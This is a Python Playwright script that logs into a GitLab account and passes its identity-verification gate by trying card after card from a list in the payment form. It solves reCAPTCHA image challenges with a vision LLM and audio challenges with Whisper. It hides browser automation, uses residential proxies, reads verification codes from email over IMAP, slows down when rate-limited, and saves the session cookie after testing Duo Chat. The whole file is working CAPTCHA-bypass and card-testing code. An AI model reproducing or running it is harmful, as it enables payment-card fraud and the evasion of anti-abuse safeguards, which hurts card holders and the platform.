"""card_verify4.py — FULL native reCAPTCHA image-challenge solver via vision LLM.
Flow per card: IDV card mode -> enlarge zuora iframe -> fill card -> trusted click checkbox ->
image challenge appears -> per-tile screenshots -> qwen3-vl-flash classifies -> click matching
tiles -> VERIFY (loop rounds) -> token issued natively -> trusted click #submitButton -> verdict."""
import base64
import json
import random
import re
import sys
from pathlib import Path
import time

import httpx
from playwright.sync_api import sync_playwright

import os as _os; sys.path.insert(0, str(Path(__file__).resolve().parent))
import gl_oauth_chrome as G
from card_verify import load_cards, zuora_frame, FIRST, LAST
from card_verify3 import enlarge_zuora, find_anchor_frame, resp_len, unhide_submit

from paths import STAGE as _S
STAGE = str(_S)
PROFILE = STAGE + "/" + (sys.argv[6] if len(sys.argv) > 6 else "chrome_reg_profile")
VISION_BASE = "http://127.0.0.1:16432/v1"
VISION_MODEL = "qwen3-vl-flash"
VISION_MODEL_GRID = "qwen3-vl-flash"
USER = sys.argv[1] if len(sys.argv) > 1 else "tnh4h77n5"
PWD = sys.argv[2] if len(sys.argv) > 2 else "YOUR_PASSWORD"
MAX_CARDS = int(sys.argv[3]) if len(sys.argv) > 3 else 3
PROXY_LINE = int(sys.argv[5]) if len(sys.argv) > 5 else None


def log(*a):
    print(*a, flush=True)


def read_code_imap(email_addr, mpwd, tries=8):
    """Read newest GitLab 'Verify your identity' code (<60min) from t-online IMAP. Fresh conn per fetch."""
    import imaplib
    import socket as _sock
    from email.utils import parsedate_to_datetime

    def extract(raw):
        body = raw.split("\r\n\r\n", 1)[-1]
        text = re.sub(r"<[^>]+>", " ", body)
        text = re.sub(r"=\r?\n", "", text)
        text = re.sub(r"\s+", " ", text)
        mm = re.search(r"(?:following code|verification code|code is)[.\s:]*?(\d{6})", text, re.I)
        if mm:
            return mm.group(1)
        c = re.findall(r"\b\d{6}\b", text)
        return c[0] if c else None

    for t in range(tries):
        try:
            _sock.setdefaulttimeout(40)
            m = imaplib.IMAP4_SSL("imap.t-online.de", 993)
            m.login(email_addr, mpwd)
            m.select("INBOX", readonly=True)
            typ, data = m.uid("search", None, '(FROM "gitlab")')
            uids = data[0].split() if data and data[0] else []
            try:
                m.close()
            except Exception:
                pass
            now = time.time()
            for u in sorted(uids, key=lambda x: int(x), reverse=True)[:3]:
                try:
                    m2 = imaplib.IMAP4_SSL("imap.t-online.de", 993)
                    m2.login(email_addr, mpwd)
                    m2.select("INBOX", readonly=True)
                    typ, msgd = m2.uid("fetch", u, "(BODY.PEEK[])")
                    try:
                        m2.close()
                    except Exception:
                        pass
                    if not msgd or not msgd[0]:
                        continue
                    raw = msgd[0][1].decode("utf-8", "ignore")
                    subj = re.search(r"^Subject: ([^\r\n]+)", raw, re.M)
                    s = subj.group(1) if subj else ""
                    if "verify your identity" not in s.lower() and "verification" not in s.lower():
                        continue
                    date = re.search(r"^Date: ([^\r\n]+)", raw, re.M)
                    age = 9e9
                    if date:
                        try:
                            age = (now - parsedate_to_datetime(date.group(1)).timestamp()) / 60
                        except Exception:
                            pass
                    code = extract(raw)
                    if code and age < 60:
                        return code
                except Exception:
                    continue
        except Exception as e:
            log("  imap err:", str(e)[:60])
        time.sleep(12)
    return None


def pass_email_code_gate(pg):
    """Handle GitLab 'Verify your identity' email-code gate after login.
    Delegates to gl_code_gate.gate_for_user — retry loop with Resend for stale/used codes."""
    from gl_code_gate import gate_for_user
    return gate_for_user(pg, USER, G)


def vision_contains(png_bytes, obj, retries=2):
    """Ask vision model if the image contains obj. Returns True/False/None(err)."""
    b64 = base64.b64encode(png_bytes).decode()
    body = {"model": VISION_MODEL,
            "messages": [{"role": "user", "content": [
                {"type": "image_url", "image_url": {"url": f"data:image/png;base64,{b64}"}},
                {"type": "text", "text": (f"Does this image contain any part of a {obj} "
                                          f"(a {obj} visible anywhere, even partially)? "
                                          "Answer with a single word: YES or NO.")}]}],
            "max_tokens": 5, "temperature": 0}
    for t in range(retries):
        try:
            r = httpx.post(VISION_BASE + "/chat/completions", json=body, timeout=45,
                           headers={"Authorization": "Bearer rotator"})
            txt = r.json()["choices"][0]["message"]["content"].strip().upper()
            if "YES" in txt:
                return True
            if "NO" in txt:
                return False
        except Exception as e:
            log(f"    vision err ({t}):", str(e)[:60])
            time.sleep(2)
    return None

def vision_grid(png_bytes, obj, n):
    """Single grid call: which tiles 1..n contain obj (numbered L-R, T-B)."""
    b64 = base64.b64encode(png_bytes).decode()
    body = {"model": VISION_MODEL_GRID,
            "messages": [{"role": "user", "content": [
                {"type": "image_url", "image_url": {"url": f"data:image/png;base64,{b64}"}},
                {"type": "text", "text": (
                    f"This is a reCAPTCHA grid of {n} image tiles, numbered 1 to {n} left-to-right, top-to-bottom. "
                    f"Which tiles show a {obj} or any part of a {obj}? Include tiles where a {obj} is only partially visible. "
                    "Answer with ONLY the tile numbers separated by commas (e.g. 2,5,7). If none, answer NONE.")}]}],
            "max_tokens": 60, "temperature": 0}
    for t in range(2):
        try:
            r = httpx.post(VISION_BASE + "/chat/completions", json=body, timeout=60,
                           headers={"Authorization": "Bearer rotator"})
            txt = r.json()["choices"][0]["message"]["content"]
            if "NONE" in txt.upper():
                return []
            return [int(x) for x in re.findall(r"\d+", txt) if 1 <= int(x) <= n]
        except Exception as e:
            log("    grid vision err:", str(e)[:60])
            time.sleep(2)
    return []

def bframe(pg):
    for f in pg.frames:
        u = f.url or ""
        if "recaptcha" in u and "bframe" in u:
            return f
    return None


def challenge_info(bf):
    """Return (kind, object, n_tiles) from the bframe DOM."""
    try:
        return bf.evaluate("""() => {
            const out = {kind: null, obj: null, tiles: 0, err: ''};
            const desc = document.querySelector('.rc-imageselect-desc, .rc-imageselect-desc-no-canonical');
            const strong = desc ? desc.querySelector('strong') : null;
            if (strong) out.obj = strong.innerText.trim();
            else if (desc) {
                const m = (desc.innerText||'').match(/with\\s+(.+?)\\s*[.!?]?$/);
                if (m) out.obj = m[1].trim();
            }
            out.tiles = document.querySelectorAll('td.rc-imageselect-tile').length;
            if (out.tiles) out.kind = 'grid';
            else if (document.querySelector('.rc-canonical-click, .rc-dynamic-canvas')) out.kind = 'canvas';
            const e = document.querySelector('.rc-imageselect-error-message, .rc-imageselect-error-dynamic-more');
            if (e && e.offsetParent) out.err = (e.innerText||'').slice(0,80);
            return out;
        }""")
    except Exception as e:
        return {"kind": None, "obj": None, "tiles": 0, "err": str(e)[:60]}


def solve_round(pg, bf, obj, n_tiles):
    """One challenge round: classify tiles, fix selections, click VERIFY. Returns state str."""
    tiles = bf.query_selector_all("td.rc-imageselect-tile")
    if not tiles:
        return "no_tiles"
    picks = [False] * len(tiles)
    if len(tiles) > 9:
        try:
            table = bf.query_selector('.rc-imageselect-table')
            if table:
                gpng = table.screenshot(timeout=8000)
                nums = vision_grid(gpng, obj, len(tiles))
                for i in range(len(tiles)):
                    picks[i] = (i + 1) in nums
                log(f"    grid picks: {nums}")
        except Exception as e:
            log("    grid err:", str(e)[:60])
    if not any(picks):
        for i, t in enumerate(tiles):
            try:
                png = t.screenshot(timeout=8000)
            except Exception:
                continue
            v = vision_contains(png, obj)
            picks[i] = bool(v)
    log(f"    round picks: {''.join('X' if p else '.' for p in picks)}")
    if not any(picks):
        # retry borderline with looser prompt via second pass on all
        log("    all NO — second pass (loose)")
        for i, t in enumerate(tiles):
            if picks[i]:
                continue
            try:
                png = t.screenshot(timeout=8000)
            except Exception:
                continue
            b64 = base64.b64encode(png).decode()
            body = {"model": VISION_MODEL,
                    "messages": [{"role": "user", "content": [
                        {"type": "image_url", "image_url": {"url": f"data:image/png;base64,{b64}"}},
                        {"type": "text", "text": (f"Could this image plausibly show part of a {obj} or be related to {obj}s? "
                                                  "Answer YES if there is any chance, otherwise NO. Single word.")}]}],
                    "max_tokens": 5, "temperature": 0}
            try:
                r = httpx.post(VISION_BASE + "/chat/completions", json=body, timeout=45,
                               headers={"Authorization": "Bearer rotator"})
                if "YES" in r.json()["choices"][0]["message"]["content"].upper():
                    picks[i] = True
            except Exception:
                pass
        log(f"    loose picks: {''.join('X' if p else '.' for p in picks)}")
        if not any(picks):
            picks[random.randrange(len(picks))] = True  # never submit empty
    # apply selections: toggle tiles whose selected-state != pick
    try:
        states = bf.evaluate("""() => {
            return [...document.querySelectorAll('td.rc-imageselect-tile')].map(t =>
                t.className.includes('selected') || t.getAttribute('aria-checked') === 'true');
        }""")
    except Exception:
        states = [False] * len(tiles)
    for i, t in enumerate(tiles):
        want = picks[i] if i < len(picks) else False
        have = states[i] if i < len(states) else False
        if want != have:
            try:
                bb = t.bounding_box()
                if bb:
                    pg.mouse.click(bb["x"] + bb["width"] / 2, bb["y"] + bb["height"] / 2)
                    pg.wait_for_timeout(350 + random.randint(0, 250))
            except Exception:
                pass
    # VERIFY
    try:
        vb = bf.query_selector("#recaptcha-verify-button, .rc-imageselect-verify-button")
        if vb:
            bb = vb.bounding_box()
            if bb:
                pg.mouse.click(bb["x"] + bb["width"] / 2, bb["y"] + bb["height"] / 2)
            else:
                vb.click(force=True)
            log("    VERIFY clicked")
    except Exception as e:
        log("    verify err:", str(e)[:60])
        return "verify_err"
    return "verified"

NUMWORDS = {"zero": "0", "one": "1", "two": "2", "three": "3", "four": "4", "five": "5",
            "six": "6", "seven": "7", "eight": "8", "nine": "9"}


_WHISPER = None


def asr_digits(b64):
    """Local whisper transcription of recaptcha audio. Modern challenges speak WORDS,
    not digits — return the cleaned spoken text as-is."""
    global _WHISPER
    import tempfile
    try:
        if _WHISPER is None:
            from faster_whisper import WhisperModel
            _WHISPER = WhisperModel("base", device="cpu", compute_type="int8")
        with tempfile.NamedTemporaryFile(suffix=".mp3", delete=False) as f:
            f.write(base64.b64decode(b64))
            tmp = f.name
        segs, _info = _WHISPER.transcribe(tmp, language="en", beam_size=5)
        txt = " ".join(s.text.strip() for s in segs)
        txt = re.sub(r"[^A-Za-z0-9 ]", " ", txt.lower())
        txt = " ".join(txt.split()).strip()
        log("    whisper:", repr(txt[:80]))
        return txt or None
    except Exception as e:
        log("    whisper err:", str(e)[:90])
        return None


def solve_audio(pg, bf):
    """Switch to / use audio challenge: fetch mp3 in-frame, ASR digits, fill, verify."""
    try:
        inp = bf.query_selector('#audio-response, input[name="c"]')
        if not inp:
            ab = bf.query_selector('#recaptcha-audio-button, button[title*="audio" i]')
            if not ab:
                return "no_audio_btn"
            bb = ab.bounding_box()
            if bb:
                pg.mouse.click(bb["x"] + bb["width"] / 2, bb["y"] + bb["height"] / 2)
            else:
                ab.click(force=True)
            pg.wait_for_timeout(4000)
            inp = bf.query_selector('#audio-response, input[name="c"]')
            if not inp:
                return "no_audio_input_after_switch"
        b64 = bf.evaluate("""async () => {
            const a = document.querySelector('audio');
            if (!a) return null;
            const src = a.src || ((a.querySelector('source') || {}).src);
            if (!src) return null;
            try {
                const r = await fetch(src);
                const buf = await r.arrayBuffer();
                const bytes = new Uint8Array(buf);
                let bin = '';
                const CH = 8192;
                for (let i = 0; i < bytes.length; i += CH) bin += String.fromCharCode.apply(null, bytes.subarray(i, i + CH));
                return btoa(bin);
            } catch(e) { return 'ERR:' + String(e).slice(0,60); }
        }""")
        if not b64 or str(b64).startswith("ERR"):
            return f"no_mp3:{str(b64)[:40]}"
        log(f"  audio mp3 {len(b64)//1024}KB")
        digits = asr_digits(b64)
        if not digits:
            return "asr_empty"
        log("  digits:", digits)
        inp.fill(digits)
        pg.wait_for_timeout(700)
        vb = bf.query_selector('#recaptcha-verify-button')
        if vb:
            bb = vb.bounding_box()
            if bb:
                pg.mouse.click(bb["x"] + bb["width"] / 2, bb["y"] + bb["height"] / 2)
            else:
                vb.click(force=True)
            return "submitted:" + digits
        return "no_verify_btn"
    except Exception as e:
        return "err:" + str(e)[:70]


def main():
    if len(sys.argv) > 4:
        import card_verify
        card_verify.CARDS = sys.argv[4]
        log("cards file override:", sys.argv[4])
    cards = load_cards()
    cards.sort(key=lambda c: 0 if len(c) > 4 and c[4] else 1)
    log("cards loaded:", len(cards), "| named in top200:", sum(1 for c in cards[:200] if len(c) > 4 and c[4]))
    attempts = []
    with sync_playwright() as pw:
        kwargs = dict(headless=False, channel="chrome",
                      viewport={"width": 1440, "height": 1000}, locale="en-US",
                      args=["--disable-blink-features=AutomationControlled", "--no-first-run", "--no-default-browser-check"])
        if PROXY_LINE is not None:
            import urllib.parse
            plines = [l.strip() for l in open(STAGE + "/res_proxies_live.txt", encoding="utf-8") if l.strip()]
            u = urllib.parse.urlparse(plines[PROXY_LINE % len(plines)])
            kwargs["proxy"] = {"server": f"http://{u.hostname}:{u.port or 1000}",
                               "username": u.username, "password": u.password}
            log("proxy line:", PROXY_LINE, "user:", u.username)
        ctx = pw.chromium.launch_persistent_context(PROFILE, **kwargs)
        pg = ctx.new_page()
        net = []

        def on_resp(r):
            try:
                u = r.url
                if ("zuora.com/apps" in u or "identity_verification" in u) and ".js" not in u and ".css" not in u:
                    net.append(f"{r.request.method} {r.status} {u[:90]}")
            except Exception:
                pass

        pg.on("response", on_resp)
        pg.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined})")
        verified = False
        try:
            pg.goto("https://gitlab.com/", wait_until="domcontentloaded", timeout=60000)
            pg.wait_for_timeout(8000 + random.randint(0, 5000))
            G.pass_cf(pg, 8)
            for lt in range(3):
                pg.goto("https://gitlab.com/users/sign_in", wait_until="domcontentloaded", timeout=60000)
                pg.wait_for_timeout(3000)
                G.pass_cf(pg, 10)
                if pg.query_selector("#user_login"):
                    pg.fill("#user_login", USER)
                    pg.fill("#user_password", PWD)
                    pg.click('input[name="commit"], button[type=submit]')
                    pg.wait_for_timeout(7000)
                    G.pass_cf(pg, 6)
                    pass_email_code_gate(pg)
                if "sign_in" not in pg.url:
                    break
                log(f"login attempt {lt} still on sign_in — retry")
            log("login:", pg.url[:70])
            if "sign_in" in pg.url:
                log("FATAL: login failed after retries")
                raise SystemExit(4)
            # identity check: wrong user in profile => false-positive "IDV gone" risk
            JS_WHO = "async () => { try { const r = await fetch('/api/v4/user'); const u = await r.json(); return u.username||''; } catch(e){ return ''; } }"
            cur_user = pg.evaluate(JS_WHO)
            log("session user:", cur_user)
            if cur_user and cur_user != USER:
                log(f"WRONG USER in profile ({cur_user}) — signing out (keeps cf_clearance)")
                pg.goto("https://gitlab.com/users/sign_out", wait_until="domcontentloaded", timeout=45000)
                pg.wait_for_timeout(2500)
                G.pass_cf(pg, 4)
                sbtn = pg.query_selector('input[name="commit"], button[type=submit]')
                if sbtn:
                    try:
                        sbtn.click()
                        pg.wait_for_timeout(3000)
                    except Exception:
                        pass
                switched = False
                for lt2 in range(3):
                    pg.goto("https://gitlab.com/users/sign_in", wait_until="domcontentloaded", timeout=60000)
                    pg.wait_for_timeout(3000)
                    G.pass_cf(pg, 10)
                    if pg.query_selector("#user_login"):
                        pg.fill("#user_login", USER)
                        pg.fill("#user_password", PWD)
                        pg.click('input[name="commit"], button[type=submit]')
                        pg.wait_for_timeout(7000)
                        G.pass_cf(pg, 6)
                        pass_email_code_gate(pg)
                    cur2 = pg.evaluate(JS_WHO)
                    if cur2 == USER:
                        log("switched to target user OK")
                        switched = True
                        break
                    log(f"switch attempt {lt2}: user={cur2!r}")
                if not switched:
                    log("FATAL: could not switch to target user")
                    raise SystemExit(6)
            cq = 0
            tries_left = MAX_CARDS * 3
            consecutive_tq = 0
            while cq < len(cards) and tries_left > 0 and not verified:
                tries_left -= 1
                idx = cq
                card = cards[idx]
                pan, mm, yyyy, cvv = card[0], card[1], card[2], card[3]
                name = card[4] if len(card) > 4 and card[4] else random.choice(FIRST) + " " + random.choice(LAST)
                pg.goto("https://gitlab.com/-/identity_verification", wait_until="domcontentloaded", timeout=60000)
                pg.wait_for_timeout(5000)
                G.pass_cf(pg, 4)
                if "sign_in" in pg.url:
                    log("session lost (sign_in) — aborting")
                    raise SystemExit(5)
                if "identity_verification" not in pg.url:
                    log("IDV gone — verified?", pg.url[:80])
                    verified = True
                    break
                if "credit card" in pg.inner_text("body").lower():
                    pg.evaluate("""() => {
                        const el=[...document.querySelectorAll('a,button')].find(x=>/credit card/i.test((x.innerText||'')) && x.offsetParent);
                        if (el) el.click();
                    }""")
                    pg.wait_for_timeout(8000)
                fr = zuora_frame(pg)
                if not fr:
                    log("no zuora frame"); continue
                ifr_rect = enlarge_zuora(pg)
                log(f"[{idx}] card {pan[:6]}******{pan[-4:]} {mm}/{yyyy} name={name}")
                try:
                    fr.fill("#input-creditCardHolderName", name)
                    fr.fill("#input-creditCardNumber", pan)
                    fr.fill("#input-cardSecurityCode", cvv)
                    fr.select_option("#input-creditCardExpirationMonth", mm)
                    fr.select_option("#input-creditCardExpirationYear", yyyy)
                except Exception as e:
                    log("  fill err:", str(e)[:80]); continue
                af = find_anchor_frame(pg)
                if not af:
                    log("  no anchor frame"); continue
                el = af.frame_element()
                box = el.bounding_box()
                if not box:
                    log("  no anchor box"); continue
                cx, cy = box["x"] + 32, box["y"] + box["height"] / 2
                pg.mouse.move(cx - 50, cy - 30); pg.wait_for_timeout(random.randint(300, 600))
                pg.mouse.move(cx, cy); pg.wait_for_timeout(random.randint(200, 450))
                pg.mouse.click(cx, cy)
                log(f"  checkbox clicked ({cx:.0f},{cy:.0f})")
                # wait for challenge or direct pass
                passed = False
                challenged = False
                for w in range(8):
                    pg.wait_for_timeout(2500)
                    rl = resp_len(pg)
                    if rl and rl > 20:
                        passed = True; break
                    bf = bframe(pg)
                    if bf:
                        ci = challenge_info(bf)
                        if ci.get("tiles"):
                            challenged = True
                            log(f"  challenge: obj={ci['obj']!r} tiles={ci['tiles']}")
                            break
                if passed:
                    log("  *** passed without challenge ***")
                elif not challenged:
                    log("  no challenge, no token — skip card")
                    pg.screenshot(path=STAGE + f"/cv4_nochal_{idx}.png")
                    attempts.append({"i": idx, "err": "no_challenge_no_token"})
                    continue
                # solve rounds: image first, audio fallback from round 1
                audio_tries = 0
                for rnd_i in range(7):
                    if resp_len(pg) > 20:
                        passed = True; break
                    bf = bframe(pg)
                    if not bf:
                        log("  bframe gone"); break
                    ci = challenge_info(bf)
                    audio_mode = False
                    try:
                        audio_mode = bf.query_selector('#audio-response, input[name="c"]') is not None
                    except Exception:
                        pass
                    if audio_tries < 3:
                        audio_tries += 1
                        ast = solve_audio(pg, bf)
                        log(f"  AUDIO attempt {audio_tries}: {ast}")
                        pg.wait_for_timeout(4500)
                        if resp_len(pg) > 20:
                            passed = True
                            break
                        continue
                    if not ci.get("tiles"):
                        if ci.get("kind") == "canvas":
                            log("  canvas challenge — unsupported, skip")
                        elif ci.get("err"):
                            log("  challenge err:", ci["err"])
                        pg.wait_for_timeout(2500)
                        if resp_len(pg) > 20:
                            passed = True
                        continue
                    obj = ci.get("obj") or "target object"
                    st = solve_round(pg, bf, obj, ci["tiles"])
                    log(f"  round {rnd_i}: {st}")
                    pg.wait_for_timeout(4000)
                    if resp_len(pg) > 20:
                        passed = True
                        break
                if not passed:
                    log("  recaptcha NOT solved after rounds — advancing card")
                    pg.screenshot(path=STAGE + f"/cv4_fail_{idx}.png")
                    attempts.append({"i": idx, "err": "recaptcha_rounds_failed"})
                    cq += 1
                    time.sleep(20)
                    continue
                log(f"  *** RECAPTCHA PASSED (resp {resp_len(pg)}) ***")
                pg.screenshot(path=STAGE + f"/cv4_passed_{idx}.png")
                # submit
                net.clear()
                fr_now = zuora_frame(pg)
                pos = unhide_submit(fr_now) if fr_now else None
                log("  submit pos:", pos)
                if pos and pos.get("w"):
                    x = (ifr_rect["x"] if ifr_rect else 0) + pos["x"] + pos["w"] / 2
                    y = (ifr_rect["y"] if ifr_rect else 0) + pos["y"] + pos["h"] / 2
                    pg.mouse.click(x, y)
                    log(f"  SUBMIT CLICK ({int(x)},{int(y)})")
                pg.wait_for_timeout(16000)
                G.pass_cf(pg, 3)
                url_now = pg.url
                body = pg.inner_text("body")[:600]
                zerr = ""
                fr2 = zuora_frame(pg)
                if fr2:
                    try:
                        zerr = fr2.evaluate("""() => {
                            const e=document.querySelector('.error, [class*=error], [id*=error]');
                            return e ? (e.innerText||'').slice(0,180).replace(/\\n/g,' ') : '';
                        }""")
                    except Exception:
                        pass
                bl = body.lower()
                success = ("identity_verification" not in url_now) or ("verified" in bl and "need to verify" not in bl)
                a = {"i": idx, "pan": pan[:6] + "..." + pan[-4:], "exp": f"{mm}/{yyyy}", "name": name,
                     "url": url_now[:100], "zerr": zerr[:150], "body": body[:420].replace("\n", " | "), "net": net[-6:]}
                attempts.append(a)
                log("  url:", url_now[:80])
                log("  zuora err:", zerr[:140] or "-")
                log("  body:", body[:400].replace("\n", " | "))
                log("  net:", json.dumps(net[-4:])[:250])
                pg.screenshot(path=STAGE + f"/cv4_{idx}.png")
                if success:
                    verified = True
                    log("*** VERIFIED VIA CARD ***")
                    break
                lowres = (zerr + body).lower()
                if "temporarily blocked" in lowres or "security reason" in lowres:
                    log("  MACHINE_BLOCKED — aborting run (each blocked submit extends the block)")
                    break
                if "too_quick" in lowres or "too many submissions" in lowres:
                    consecutive_tq += 1
                    if consecutive_tq >= 3:
                        log("  Submit_Too_Quick x3 — aborting run")
                        break
                    wait_s = min(150 * consecutive_tq, 600)
                    log(f"  Submit_Too_Quick — cooling {wait_s}s, will retry same card")
                    time.sleep(wait_s)
                    continue
                consecutive_tq = 0
                cq += 1
                if cq < len(cards) and tries_left > 0:
                    log("  pacing 90s before next card")
                    time.sleep(90)
            if verified:
                pg.goto("https://gitlab.com/groups/nvvdkt666", wait_until="domcontentloaded", timeout=60000)
                pg.wait_for_timeout(8000)
                ta = pg.query_selector("[data-testid='chat-prompt-input'], textarea[placeholder*='work through']")
                if ta:
                    ta.evaluate("el => el.focus()")
                    pg.keyboard.type("Reply with exactly: DUO_OK", delay=20)
                    pg.wait_for_timeout(600)
                    pg.evaluate("""() => {
                        for (const s of ['[data-testid=duo-chat-send-button]','button[aria-label*=Send i]','button[type=submit]']) {
                            for (const b of document.querySelectorAll(s)) if (b.offsetParent && !b.disabled) { b.click(); return; }
                        }
                    }""")
                    resp = ""
                    for i in range(16):
                        pg.wait_for_timeout(5000)
                        resp = pg.evaluate("""() => {
                            const out=[]; document.querySelectorAll('[class*=duo],[class*=chat],[class*=message]').forEach(e=>{
                                const t=(e.innerText||'').trim(); if(t&&t.length>2&&t.length<600) out.push(t);});
                            return out.slice(-3).join(' || ');
                        }""")
                        if "DUO_OK" in resp and "Reply with" not in resp[-150:]:
                            break
                    log("DUO RESP tail:", (resp or "")[-220:])
                    pg.screenshot(path=STAGE + "/cv4_duo.png")
                cookies = ctx.cookies("https://gitlab.com")
                sess = [c["value"] for c in cookies if c["name"] == "_gitlab_session"]
                if sess:
                    json.dump({"username": USER, "session": sess[0], "ts": time.time()},
                              open(STAGE + "/tn_session.json", "w"))
                    log("SESSION SAVED")
        except Exception as e:
            log("ERR:", f"{type(e).__name__}: {str(e)[:150]}")
        finally:
            ctx.close()
    json.dump({"ts": time.time(), "attempts": attempts}, open(STAGE + "/card_attempts4.json", "w"), indent=1)
    log("attempts:", len(attempts))
    log("CARD VERIFY4 DONE")


if __name__ == "__main__":
    main()
